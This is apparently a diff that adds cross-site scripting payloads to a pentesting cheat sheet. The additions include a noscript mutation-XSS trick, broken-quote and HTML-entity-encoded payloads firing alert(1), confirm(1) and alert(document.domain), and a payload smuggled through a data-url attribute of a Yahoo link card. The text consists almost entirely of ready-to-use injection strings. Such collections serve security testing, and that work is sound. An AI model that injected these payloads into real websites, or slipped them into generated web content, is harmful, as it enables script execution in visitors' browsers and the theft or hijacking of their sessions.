@@ -26,3 +26,16 @@
 *** Try to change request method (POST instead of GET): ***
 GET /?q=xss POST /?q=xss
 
+** No Script **
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
+
+** Null **
+">"><script src="<script>alert(1)</script>">
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+“><%2fscript><script>alert(document.domain)<%2fscript>
+
+** DIV **
+<div class="yahoo-link-enhancr-card" data-url="https://www.youtube.com/aaa&quot;&gt;&lt;img src=x onerror=alert(/xss/)&gt;&lt;">
+
+
